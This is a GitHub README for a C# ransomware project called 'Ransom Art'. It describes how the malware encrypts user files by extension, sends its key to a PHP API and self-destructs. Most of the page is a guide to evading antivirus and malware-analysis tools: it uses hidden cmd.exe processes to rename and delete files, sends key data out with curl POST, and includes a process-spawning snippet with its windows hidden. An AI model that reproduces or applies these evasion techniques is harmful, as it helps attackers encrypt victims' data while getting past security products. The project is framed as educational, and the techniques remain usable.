# Ransom Art

The goal of this project is to show how a malware can easily leverage the use of Command Prompt and PowerShell, and how their non-harmful methods can aid the malware to achieve its goal.

**So far I choose to have this source code private because of the security concerns. This repository is purely for showcase. Please do not ask for the source code.**

Windows Forms application made in Visual Studio, written in C# (.NET Framework v4.0).

Ransomware is set to start encrypting files from the `%USERPROFILE%` directory and only inside the `%USERPROFILE%` directory (modify it to your need).

Only the files defined in the list below will be encrypted (modify it to your need):

```csharp
private readonly List<string> extensions = new List<string> { ".txt", ".log", ".pdf", ".doc", ".docx", ".docm", ".ppt", ".pptx", ".pptm", ".xls", ".xlsx", ".xlsm", ".zip", ".7z", ".rar" };
```

All the code you need is in these two files:

* [RansomArt.cs] (Encryptor)
* [RansomArtDecryptor.cs] (Decryptor)

Ransomware will self-destruct if it:
* fails to send the encryption key to the server,
* receives unexpected or no server response,
* finishes encryption/decryption phase.

Ransomware was tested on Windows 10 Enterprise OS version 1909 (64-bit) inside a virtual machine with access to the Internet.

API was tested on XAMPP for Windows v7.4.3 (64-bit) outside the virtual machine – a public address was given with [ngrok](https://ngrok.com/).

Made for educational purposes. I hope it will help!

Ransomware was inspired by [goliate/hidden-tear](https://github.com/goliate/hidden-tear).

## How to Run

**Run this malware exclusively inside a virtual machine and with utmost care; otherwise, you risk of permanently losing your data and/or damaging your PC.**

Import [\\db\\ransom_art.sql](https://github.com/ivan-sincek/ransom-art/blob/master/db/ransom_art.sql) to your database server.

Copy all the content from [\\src\\api\\](https://github.com/ivan-sincek/ransom-art/tree/master/src/api) to your server's web root directory (e.g. to \\xampp\\htdocs\\ on XAMPP).

Change the database settings inside [\\src\\api\\php\\config.ini](https://github.com/ivan-sincek/ransom-art/blob/master/src/api/php/config.ini) as necessary.

Run \\exec\\RansomArt.exe.

Decryption file will be created and run automatically after the encryption phase.

**Executable provided will only work if it is run on the same localhost as the API server.**

You can use [ngrok](https://ngrok.com) to give your XAMPP a public address, but don't forget to change and recompile the source code.

---

On web servers other than XAMPP (Apache) you might need to load `Multibyte String` librabry within PHP.

In XAMPP it is as simple as uncommenting the `extension=mbstring` line in the `php.ini` file.

## Antivirus and Malware Analysis Tool Bypass

Requirements:

* victim needs to have cURL installed,
* victim needs to have access to Command Prompt or PowerShell,
* victim needs to have access to the Internet.

Windows 10 version 1803 and grater have cURL by default.

**This ransomware was tested only on few antiviruses and malware analysis tools! I do not claim nor guarantee that this method will bypass every security product!**

### Antiviruses

Antiviruses will flag any executable as malicious if the executable tries to modify any file on the system in any shape or form (e.g. if the executable tries to rename, rewrite the content of or delete a file) that is older than the executable.

Antiviruses WILL raise an alert on C# methods such as:

```csharp
File.Move(file, file + “.ransom”);

File.WriteAllBytes(file, bytes);

File.Delete(file);
```

Antiviruses will not flag an executable as malicious if the executable runs a new "trusted" process, e.g. `cmd.exe` that will then carry out the rename method. Once a file is successfully renamed, the file's metadata will refresh, and the executable (i.e. malware) can freely write the encrypted content in the file.

Antiviruses WILL NOT raise an alert on Batch rename method:

```batch
CMD.EXE /C MOVE /Y "file" "file.ransom"
```

Antiviruses WILL in fact raise an alert on Batch delete method:

```batch
CMD.EXE /C DEL /F /Q "file"
```

Antiviruses will not raise an alert if a file is moved to a temporary directory and then deleted together with the whole directory.

Antiviruses WILL NOT raise an alert on Batch remove directory method:

```batch
CMD.EXE /C MOVE /Y "file" "temp" && RMDIR /S /Q "temp"
```

### Malware Analysis Tools

Malware analysis tools WILL raise an alert on C# objects such as the `WebClient` object:

```csharp
WebClient client = new WebClient(); client.UploadString("url", "json");
```

Malware analysis tools will not raise an alert if the executable runs a new "trusted" process, e.g. `cmd.exe` that will then contact the API server via cURL.

Malware analysis tools WILL NOT raise an alert on Batch cURL method:

```batch
CMD.EXE /C CURL -X POST –DATA "json" "url"
```

Could be because some sandbox virtual machines lack cURL or up-to-date Windows OS.

On the other hand, some malware analysis tools will send an HTTP GET request to the found URLs, but this will not trigger the damage routine in this ransomware. To trigger the damage routine in this ransomware, a specific HTTP POST request must be sent, and the specific HTTP response must be returned from the API server.

Malware analysis tools WILL raise an alert on root process deletion (i.e. self-destruction):

```batch
CMD.EXE /C TIMEOUT 2 && DEL /F /Q "malware.exe"
```

To bypass the alert, delete the encryptor file with the help of the decryptor file, or just omit the file deletion altogether because most malware analysis tools keep the submitted samples anyway.

### Process Creation Snippet

```csharp
private string CreateProcess(string name, string arguments, bool wait = true)
{
	string response = "";
	Process process = null;
	try
	{
		process = new Process();
		process.StartInfo = new ProcessStartInfo();
		process.StartInfo.FileName = name;
		process.StartInfo.Arguments = arguments;
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.RedirectStandardOutput = true;
		// suppress possible errors
		process.StartInfo.ErrorDialog = false;
		process.EnableRaisingEvents = false;
		process.Start();
		if (wait)
		{
			// pipe the response back to the main program
			response = process.StandardOutput.ReadToEnd();
			// make the method synchronous for cURL and rename methods
			process.WaitForExit();
		}
	}
	catch (Exception) { }
	finally
	{
		if (process != null)
		{
			process.Dispose();
		}
	}
	return response;
}
```

## Images

<p align="center"><img src="https://github.com/ivan-sincek/ransom-art/blob/master/img/encryptor.jpg" alt="Encryptor"></p>

<p align="center">Figure 1 - Encryptor</p>

<p align="center"><img src="https://github.com/ivan-sincek/ransom-art/blob/master/img/decryptor.jpg" alt="Decryptor"></p>

<p align="center">Figure 2 - Decryptor</p>

<p align="center"><img src="https://github.com/ivan-sincek/ransom-art/blob/master/img/db.jpg" alt="Database"></p>

<p align="center">Figure 3 - Database</p>
